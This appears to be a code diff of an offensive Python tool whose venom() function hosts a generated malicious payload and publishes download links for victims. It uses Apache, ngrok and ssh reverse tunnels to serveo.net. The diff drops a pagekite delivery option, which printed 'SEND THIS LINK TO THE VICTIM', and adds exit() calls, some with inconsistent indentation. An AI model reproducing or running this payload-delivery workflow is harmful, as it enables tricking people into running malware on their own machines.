@@ -118,21 +118,23 @@ def venom():
 			                os.system("service apache2 start") 
 			                print("SERVER AND PORT FORWARDING ENABLED.....")
 			                os.system(f"ssh -R {port}:{ip}:{port} serveo.net -R  febrev.serveo.net:80:localhost:80")
+					exit()
 	        else:
 		           print("PORT FORWARDING ENABLED>>>>>>>>>>")
 		           print("C-A-U-T-I-O-N :CLOSING THIS WINDOW COULD STOP PORT FORWARDING")
 		           os.system(f"ssh -R {port}:{ip}:{port} serveo.net")
+			   exit()
     
     else:
         print("INPUT TYPE ERROR : YOU SHOULD CHOOSE A NUMBER BETWEEN 1 to 4. !!!")
         print("exiting......")
+	exit()
 
 
     server=input("DO YOU WANT TO SEND YOUR PAYLOAD VIA A LINK? [Y/n] : ")
     if server=="Y" or server=="y":
       print("[1]generate link through ngrok")
-      print("[2]generate link through pagekite")
-      print("[3]GENERATE CUSTOM LINK URL VIA SERVEO.NET(the best ever method)")
+      print("[2]GENERATE CUSTOM LINK URL VIA SERVEO.NET(the best ever method)")
       link=int(input("ENTER YOUR CHOICE : "))
       if link==1:
             os.system(f"cp {output}/{name} /var/www/html")
@@ -169,24 +171,7 @@ def venom():
                    input(f" FOR EXAMPLE : ===>> https://1234abc45d.ngrok.io/{name}(enter to continue)")
                    os.system("./ngrok http 80")
                    print("#######HAPPY HACKING#############")
-                         
       elif link==2:
-           os.system(f"cp {output}/{name} /var/www/html")
-           print("INSTALLING PAGEKITE FOR YOU>>>>")
-           os.system("sudo apt-get install pagekite")
-           pkname=input("ENTER ANY NAME TO YOUR DOMAIN OF THE LINK (Eg; febrev) : ")
-           print(" ENTER THE CORRECT MAIL ID and A PASSWORD FOR REGISTERING in PAGEKITE")
-           print(" ONCE THE DOMAIN IS REGISTERED THEN IT WONT BE CHANGED.....!so REMEMBER THE NAME OF DOMAIN")
-           print("###SERVER STARTED###")
-           print(" ")
-           print(f" SEND THIS LINK TO THE VICTIM ====>>>>   pagekite {pkname}.pagekite.me/{name}")
-           print("  ")
-           print(" ")
-           print(" ")
-           os.system("service apache2 start")
-           os.system(f"pagekite {pkname}.pagekite.me")
-           print("#######HAPPY HACKING#############")
-      elif link==3:
            os.system(f"cp {output}/{name} /var/www/html")
            print("[1] DEFAULT URL (https://frvenom.serveo.net)")
            print("[2] MAKE YOUR OWN CUSTOM DOMAIN NAME(eg:https://yourname.serveo.net)")
